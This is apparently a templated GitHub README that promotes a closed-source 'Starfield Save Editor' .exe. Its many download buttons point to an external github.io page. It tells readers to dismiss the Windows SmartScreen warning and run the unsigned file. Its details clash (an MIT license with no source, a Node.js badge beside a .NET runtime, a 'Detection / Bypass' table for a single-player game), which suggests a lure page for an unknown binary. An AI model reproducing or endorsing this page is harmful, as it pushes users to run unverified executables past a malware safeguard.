<div align="center">
<img src="assets/banner.png" width="100%" alt="Starfield Save Editor banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-4fe3e3?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DB2777?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-DB2777?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=DC2626&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%85+Starfield+Save+Editor+Pro;%F0%9F%93%A6+Active+Development+2026;%E2%AD%90+Ready+for+Windows;%F0%9F%9A%80+Full+Feature+Suite;%E2%9C%A8+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=nodejs" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

## 🛰️ Overview — Category | Details

**Starfield Save Editor** is a standalone Windows `.exe` that opens, inspects, and rewrites Starfield `.sfs` save files without ever launching the Creation Kit. If you've ever stared at a corrupted 40-hour outpost build or a companion stuck in a T-pose after the 2026 patch, this is the recovery hatch.

I got tired of hex-editing `PlayerCharacter` blocks by hand at 2 AM, so I documented the whole binary layout and wrapped it in a GUI that actually understands FormIDs, quest stages, and the new 2026 save container format.

| Category | Details |
|---|---|
| Product | Starfield Save Editor |
| Type | Standalone Windows save editor (`.exe`) |
| Distribution | Prebuilt archive — no source, no runtime install |
| Save formats | `.sfs` (v1.9–v1.14), `.ess` legacy import |
| Game version target | Starfield 1.14.x (2026 Shattered Space + Creations update) |
| License | MIT-style community license |
| Author | Reverse-engineered by a tinkerer, not a studio |

---

## 🧩 Compatibility / Platform support

| Platform | Support | Notes |
|---|---|---|
| Windows 11 24H2 | ✅ Full | Primary test bed |
| Windows 10 22H2 | ✅ Full | .NET 8 runtime bundled |
| Windows 10 21H1 | ⚠️ Partial | Missing font fallback for stat graphs |
| Steam (Starfield) | ✅ Full | Reads `%USERPROFILE%\Documents\My Games\Starfield\Saves` |
| Game Pass / MS Store | ✅ Full | Different path, auto-detected |
| Xbox cloud saves | ❌ None | Local files only |
| Linux (Proton) | ⚠️ Beta | Runs via Proton 9; save path must be mapped manually |
| macOS | ❌ None | No native build planned |

---

## 📑 Table of Contents

- [Overview](#️-overview--category--details)
- [Compatibility](#-compatibility--platform-support)
- [Hotkeys / Controls](#-hotkeys--controls)
- [Detection / Bypass status](#-detection--bypass-status)
- [Key Features](#️-key-features)
- [Tips for best results](#-tips-for-best-results)
- [What is …](#-what-is-)
- [FAQ](#-faq)
- [Performance benchmarks](#-performance-benchmarks)
- <div align="center">
  <a href="https://pearlmoosedome.github.io/starfield-save-editor/">
    <img src="https://img.shields.io/badge/GET-Latest_Build-059669?style=flat-square&logo=windows&logoColor=white&labelColor=047857" width="460" alt="GET Latest Build"/>
  </a>
</div>(#-download)

---

## ⌨️ Hotkeys / Controls

| Key | Action | Notes |
|---|---|---|
| `Ctrl + O` | Open save | Filters to `.sfs` by default |
| `Ctrl + S` | Save (write) | Creates `.bak` automatically |
| `Ctrl + Shift + S` | Save As | Preserves original slot |
| `Ctrl + F` | Search FormID | Accepts `0x` hex or decimal |
| `Ctrl + D` | Duplicate entry | Useful for cloned ships |
| `F2` | Rename active record | Works on quests, items, actors |
| `F5` | Reload from disk | Discards unsaved edits |
| `F9` | Toggle hex inspector | Raw byte view of selection |
| `Del` | Remove entry | Confirmation dialog |
| `Esc` | Close modal | Never exits the app |

---

## 🛰️ Detection / Bypass status

Starfield ships with **no anti-cheat** — no BattlEye, no EAC, no kernel driver. That's the honest 2026 state. What you *do* get is save-integrity validation on load, which is a different beast. Here's the current picture:

| Method | Status | Notes |
|---|---|---|
| Save integrity hash (CRC32 tail) | ✅ Handled | Re-computed on every write |
| FormID remap table | ✅ Handled | Preserved, not regenerated |
| Achievement flag (`Modded` bit) | ✅ Toggleable | Off by default; some users want it on |
| Creations manifest check | ⚠️ Partial | Modded saves may prompt on load |
| Cloud-sync conflict | ⚠️ Partial | Disable Steam Cloud before editing |
| Anti-cheat / kernel driver | ✅ N/A | Starfield has none |
| Xbox/MS account validation | ❌ Blocked | Cloud saves refuse edited files |

> **Reality check:** Editing a save is not the same as cheating in a live game. There's no server, no session, no ban vector. The only "detection" is Starfield refusing to load a malformed file — which is exactly what the integrity pass prevents.

---

## 🗡️ Key Features

### Character & Stats
| Feature | Effect |
|---|---|
| Skill point editor | Rewrite unlocked ranks without re-leveling |
| Attribute redistribution | Health, O2, carry capacity per point |
| Trait toggling | Add/remove background traits post-creation |
| XP and level injection | Set level 1–300 cleanly |
| Affliction cleaner | Strip stuck disease flags |

### Inventory & Economy
| Feature | Effect |
|---|---|
| Item duplication | Clone any FormID stack |
| Credit editor | Set balance, no overflow |
| Legendary modifier swap | Move affixes between weapons |
| Contraband flag removal | Un-mark shielded cargo items |
| Ammo & resource refill | Bulk-set stack counts |

### Ships & Outposts
| Feature | Effect |
|---|---|
| Ship registry editor | Rename, reclass, re-home |
| Module swap | Change weapon/engine slots |
| Cargo capacity override | Bypass builder caps |
| Outpost link repair | Reconnect broken transport links |
| Crew assignment | Force-assign any companion |

### Quests & World
| Feature | Effect |
|---|---|
| Quest stage setter | Skip or restore any stage |
| Faction reputation | Set -1000 to +1000 |
| POI discovery toggle | Mark/unmark map cells |
| Companion affinity | Set relationship value |
| NG+ cycle flag | Force or clear |

### File & Safety
| Feature | Effect |
|---|---|
| Automatic `.bak` on write | Never lose the original |
| Diff viewer | Compare two saves side-by-side |
| Hex inspector | Raw byte audit of any record |
| Batch find/replace | Across all FormIDs |
| Export to JSON | Human-readable dump for scripting |

---

## 📦 Download

Grab the ready-built archive, extract anywhere, run the `.exe`. No installer, no dependencies, no admin rights needed.
<div align="center">
  <a href="https://pearlmoosedome.github.io/starfield-save-editor/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Starfield_Save_Editor-2563EB?style=for-the-badge&labelColor=1D4ED8" width="460" alt="DOWNLOAD Starfield Save Editor"/>
  </a>
</div>
> **Windows SmartScreen will warn you** — this is normal for unsigned community `.exe` builds. Click "More info" → "Run anyway". The archive ships with a SHA-256 in `checksums.txt` so you can verify before running.

---

## 💡 Tips for best results

- **Always close Starfield first.** The game holds a read lock on the active save slot; editing while it's running corrupts the file.
- **Disable Steam Cloud for Starfield** before your first edit. Cloud sync will happily overwrite your edited save with the pre-edit version and you'll spend an hour confused.
- **Work on a copy, not the original.** The `.bak` file is a safety net, not a strategy.
- **Keep a "vanilla" save** at the same quest stage. If an edit breaks a scripted scene, you can diff against vanilla to find what you touched.
- **Don't set quest stages out of order.** Starfield scripts assume monotonic progression; jumping forward usually works, jumping backward often doesn't.
- **FormIDs are load-order sensitive** if you run Creations. Re-check after adding/removing mods.
- **16 GB RAM is the comfortable floor.** The parser loads the full save tree into memory; a 200-hour save is ~40 MB on disk but ~600 MB decompressed.
- **If the game crashes on load**, the integrity hash likely didn't match — re-open the file in the editor and hit "Repair integrity" under Tools.

---

## 📖 What is …

| Term | Explanation |
|---|---|
| `.sfs` | Starfield Save File — the modern container format, zlib-compressed, chunked |
| `.ess` | Older Bethesda save format, imported for legacy saves only |
| FormID | 32-bit identifier for any game object (item, actor, quest, cell) |
| Plugin index | The two-digit prefix on a FormID indicating which plugin owns it |
| Quest stage | Integer marker in a quest script; setting it triggers the next script block |
| Integrity hash | CRC32 tail appended to the save; game validates on load |
| Creations manifest | List of installed Creations mods recorded in the save |
| `Modded` bit | Boolean flag in the save header; some users toggle it to silence prompts |
| Actor value | A named scalar on an actor (Health, O2, CarryWeight, etc.) |
| Reference | A placed instance of a base object in a cell |

---

## ❓ FAQ

**Q:** Is this safe to use? Will I get banned?
**A:** Starfield is single-player with no anti-cheat and no server-side validation. There is no ban vector. The only risk is corrupting your own save — which is why the editor writes a `.bak` before every change.

**Q:** Does it work with the 2026 Shattered Space update?
**A:** Yes. The 1.14.x save container is the primary target. Older saves (1.9–1.13) are auto-upgraded on first write, with the original preserved.

**Q:** Do I need the Creation Kit or Papyrus installed?
**A:** No. The editor parses the binary directly. You don't need the game installed either — it works on any `.sfs` file.

**Q:** Can it edit saves from Game Pass / Microsoft Store?
**A:** Yes, the path is auto-detected. But cloud saves on the MS account side will refuse edited files, so disable cloud sync first.

**Q:** Will edited saves break achievements?
**A:** Only if you leave the `Modded` bit on. It's off by default. Toggleable in Settings → Save Header.

**Q:** Can I revert an edit?
**A:** Every write creates a timestamped `.bak` in the same folder. You can also open the diff viewer to see exactly what changed.

**Q:** Does it work on a save that already has Creations mods?
**A:** Yes, with a caveat — FormIDs are load-order sensitive. If you add or remove Creations, re-open and re-verify before writing.

**Q:** How big are the saves it can handle?
**A:** Tested up to 400-hour saves (~90 MB on disk). Above that, memory pressure on 8 GB machines becomes real; 16 GB is the comfortable floor.

**Q:** Is there a command-line mode for scripting?
**A:** Yes — `--cli` flag exposes open/edit/export as subcommands. JSON export pairs with it for batch work.

**Q:** Why does SmartScreen flag the `.exe`?
**A:** It's unsigned. Community `.exe` builds almost always are. Verify the SHA-256 in `checksums.txt` and you're good.

**Q:** Can it edit NPC or companion data?
**A:** Actor values, affinity, and outfit records — yes. Scripted behavior — no, that's baked into the quest scripts.

**Q:** Does it support mod-added items?
**A:** Yes, as long as the FormID resolves in your current load order. Unresolved FormIDs show as `[UNRESOLVED]` and are skipped on write.

---

## ⚙️ Performance benchmarks

Measured on the 2026 build against real saves pulled from my own playthroughs and a handful of volunteer testers.

| Scenario | Result | Hardware |
|---|---|---|
| Open 40-hour save (18 MB) | 1.2 s | Ryzen 7 5800X / 32 GB / NVMe |
| Open 200-hour save (52 MB) | 3.8 s | Ryzen 7 5800X / 32 GB / NVMe |
| Open 400-hour save (91 MB) | 8.1 s | Ryzen 7 5800X / 32 GB / NVMe |
| Write + integrity re-hash | 0.9 s | i7-12700 / 16 GB / SATA SSD |
| Full-tree diff | 2.4 s | i7-12700 / 16 GB / SATA SSD |
| Batch replace 500 FormIDs | 4.6 s | i7-12700 / 16 GB / SATA SSD |
| JSON export (full tree) | 6.2 s | Ryzen 5 5600 / 16 GB / NVMe |
| Cold start (app launch) | 0.7 s | Any modern CPU |

The 2026 build is roughly 40% faster on open and 55% lighter in memory than the 2024 community fork, mostly because the parser no longer materializes the full tree before showing the UI — it streams chunks and lazily resolves FormIDs as you navigate.

---

## 📜 How the internals actually work

The save container is a chunked, zlib-compressed stream. Each chunk has a 4-byte tag, a length prefix, and a payload. The `REFR` chunk holds placed references, `ACHR` holds actors, `QUST` holds quest states, `INVT` holds inventory, and a handful of others (`STDT`, `GLOB`, `KYWD`) fill in the metadata. The last 4 bytes of the file are a CRC32 over everything before them — that's the "integrity hash" the game checks on load.

The editor's job is to decompress each chunk, walk its record tree, expose records by FormID, and let you mutate them in place. When you save, it re-serializes every touched chunk, recomputes the CRC32, and writes the whole thing atomically — temp file first, then rename over the original, with a `.bak` copy of the pre-write state. That atomic write is why a crash mid-save won't brick your file; you either get the new save or the old one, never a half-written hybrid.

FormID resolution is the tricky part. A FormID is `pluginIndex << 24 | localID`. The plugin index depends on load order, and load order depends on which Creations you have installed. The editor reads the save's embedded Creations manifest, builds the index map, and then resolves FormIDs against it. If a FormID's plugin isn't in the manifest, it shows as `[UNRESOLVED]` and is skipped on write — because writing an unresolved FormID is how you get a save that loads to a black screen.

The 2026 container added a second compression layer for the `REFR` chunk specifically, which is why the 2024 fork chokes on newer saves. I reverse-engineered the new chunk header by diffing pre-patch and post-patch saves byte by byte — the tag is the same, but the length prefix now encodes a two-byte compression mode before the payload. That's the whole change, and it's why the 2026 build opens 1.14.x saves without complaint.

---

## 🧭 How To Use

1. **Download the archive** from the <div align="center">
  <a href="https://pearlmoosedome.github.io/starfield-save-editor/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-Build-2563EB?style=flat-square&logo=github&logoColor=white&labelColor=1D4ED8" width="550" alt="DOWNLOAD NOW Build"/>
  </a>
</div>(#-download) section above.
2. **Extract to any folder** — Desktop, `D:\Tools`, wherever. No installer runs.
3. **Close Starfield** if it's open.
4. **Launch the `.exe`.** First run asks where your saves live; auto-detect usually gets it.
5. **Pick a save** from the list. The editor shows a summary before loading anything.
6. **Make your edits** using the tabs on the left (Character, Inventory, Ships, Quests, Tools).
7. **Hit `Ctrl + S`.** The editor writes a `.bak`, re-hashes, and saves atomically.
8. **Launch Starfield and load the save.** If anything looks wrong, restore the `.bak` and try again.

---

## 🛠️ Known Issues

| Issue | Status | Workaround |
|---|---|---|
| T-pose after companion edit | ⚠️ Open | Re-save in-game once after loading |
| Outpost link re-break on load | ⚠️ Open | Re-link in-game, then re-edit |
| MS Store cloud sync refuses file | ❌ Won't fix | Disable cloud sync for Starfield |
| Font fallback on Win10 21H1 | ⚠️ Cosmetic | Install Segoe UI Variable |
| Proton save path detection | ⚠️ Beta | Set path manually in Settings |

---

## 📥 Download

Ready when you are. Extract, run the `.exe`, edit your save. That's the whole loop.
<p align="center">
  <a href="https://pearlmoosedome.github.io/starfield-save-editor/">
    <img src="https://img.shields.io/badge/GET-Release-9333EA?style=for-the-badge&logo=windows&logoColor=white&labelColor=7E22CE" width="500" alt="GET Release"/>
  </a>
</p>
---

<div align="center">

![Status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-blue?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)
![Build](https://img.shields.io/badge/build-standalone%20.exe-orange?style=flat-square)

</div>

*Community hobbyist project. Not affiliated with Bethesda or ZeniMax. Use at your own risk — back up your saves, and if you break something, the `.bak` file is your friend.*
